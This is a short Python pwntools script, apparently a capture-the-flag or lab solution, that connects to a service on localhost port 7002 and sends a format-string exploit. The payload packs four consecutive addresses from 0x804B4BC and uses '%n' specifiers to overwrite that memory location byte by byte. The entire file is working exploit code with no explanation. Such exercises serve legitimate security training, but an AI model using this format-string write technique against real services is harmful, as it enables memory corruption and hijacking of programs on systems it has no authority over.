#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

def main():
    address = "localhost"
    port = 7002

    payload = ""

    offset = 12

    r = remote( address, port )

    to_overwrite = 0x804B4BC

    resp = r.recvrepeat(0.2)
    payload += p32( to_overwrite )
    payload += p32( to_overwrite + 1 )
    payload += p32( to_overwrite + 2 )
    payload += p32( to_overwrite + 3 )
    payload += '%226x%3$n%159x%4$n%115x%5$n%260x%6$n'

    r.sendline( payload )

    resp = r.recvrepeat(0.2)
    print resp

if __name__ == '__main__':
    main()
